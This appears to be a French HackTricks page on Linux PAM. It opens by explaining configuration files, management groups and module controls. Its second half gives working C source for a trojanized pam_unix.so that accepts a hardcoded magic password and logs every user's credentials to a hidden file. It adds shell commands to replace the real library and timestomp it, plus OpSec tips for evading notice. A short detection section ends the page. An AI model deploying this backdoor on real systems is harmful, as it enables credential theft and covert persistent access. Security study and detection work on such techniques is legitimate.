# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### Informations de base

**PAM (Pluggable Authentication Modules)** agit comme un mécanisme de sécurité qui **vérifie l'identité des utilisateurs tentant d'accéder aux services informatiques**, contrôlant leur accès en fonction de divers critères. C'est semblable à un gardien numérique, garantissant que seuls les utilisateurs autorisés peuvent interagir avec des services spécifiques tout en limitant potentiellement leur utilisation pour éviter les surcharges du système.

#### Fichiers de configuration

- **Les systèmes Solaris et basés sur UNIX** utilisent généralement un fichier de configuration central situé à `/etc/pam.conf`.
- **Les systèmes Linux** préfèrent une approche par répertoire, stockant des configurations spécifiques aux services dans `/etc/pam.d`. Par exemple, le fichier de configuration pour le service de connexion se trouve à `/etc/pam.d/login`.

Un exemple de configuration PAM pour le service de connexion pourrait ressembler à ceci :
```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```
#### **Royaumes de gestion PAM**

Ces royaumes, ou groupes de gestion, incluent **auth**, **account**, **password** et **session**, chacun responsable de différents aspects du processus d'authentification et de gestion des sessions :

- **Auth** : Valide l'identité de l'utilisateur, souvent en demandant un mot de passe.
- **Account** : Gère la vérification des comptes, vérifiant des conditions telles que l'appartenance à un groupe ou des restrictions horaires.
- **Password** : Gère les mises à jour de mot de passe, y compris les vérifications de complexité ou la prévention des attaques par dictionnaire.
- **Session** : Gère les actions lors du début ou de la fin d'une session de service, comme le montage de répertoires ou la définition de limites de ressources.

#### **Contrôles des modules PAM**

Les contrôles dictent la réponse du module en cas de succès ou d'échec, influençant le processus d'authentification global. Ceux-ci incluent :

- **Required** : L'échec d'un module requis entraîne un échec final, mais seulement après que tous les modules suivants aient été vérifiés.
- **Requisite** : Terminaison immédiate du processus en cas d'échec.
- **Sufficient** : Le succès contourne les autres vérifications du même royaume à moins qu'un module suivant échoue.
- **Optional** : Ne cause un échec que si c'est le seul module dans la pile.

#### Scénario d'exemple

Dans une configuration avec plusieurs modules d'authentification, le processus suit un ordre strict. Si le module `pam_securetty` trouve le terminal de connexion non autorisé, les connexions root sont bloquées, mais tous les modules sont tout de même traités en raison de son statut "required". Le `pam_env` définit des variables d'environnement, pouvant aider à l'expérience utilisateur. Les modules `pam_ldap` et `pam_unix` travaillent ensemble pour authentifier l'utilisateur, `pam_unix` tentant d'utiliser un mot de passe précédemment fourni, améliorant l'efficacité et la flexibilité des méthodes d'authentification.

## Backdooring PAM – Hooking `pam_unix.so`

Un truc classique de persistance dans les environnements Linux de haute valeur est de **remplacer la bibliothèque PAM légitime par un drop-in trojanisé**. Parce que chaque connexion SSH / console finit par appeler `pam_unix.so:pam_sm_authenticate()`, quelques lignes de C suffisent pour capturer des identifiants ou mettre en œuvre un contournement de mot de passe *magique*.

### Compilation Cheatsheet
```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

static int (*orig)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
const char *user, *pass;
pam_get_user(pamh, &user, NULL);
pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

/* Magic pwd → immediate success */
if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

/* Credential harvesting */
int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
dprintf(fd, "%s:%s\n", user, pass);
close(fd);

/* Fall back to original function */
if(!orig) {
orig = dlsym(RTLD_NEXT, "pam_sm_authenticate");
}
return orig(pamh, flags, argc, argv);
}
```
Compiler et remplacer en toute discrétion :
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```
### Conseils OpSec
1. **Écrasement atomique** – écrivez dans un fichier temporaire et `mv` à l'emplacement pour éviter des bibliothèques à moitié écrites qui bloqueraient SSH.
2. Placement des fichiers journaux tel que `/usr/bin/.dbus.log` se fond avec des artefacts de bureau légitimes.
3. Gardez les exports de symboles identiques (`pam_sm_setcred`, etc.) pour éviter un comportement incorrect de PAM.

### Détection
* Comparez MD5/SHA256 de `pam_unix.so` avec le paquet de la distribution.
* Vérifiez les permissions d'écriture pour tous ou une propriété inhabituelle sous `/lib/security/`.
* Règle `auditd` : `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.

### Références

- [https://hotpotato.tistory.com/434](https://hotpotato.tistory.com/434)
- [Palo Alto Unit42 – Infiltration of Global Telecom Networks](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)

{{#include ../../banners/hacktricks-training.md}}
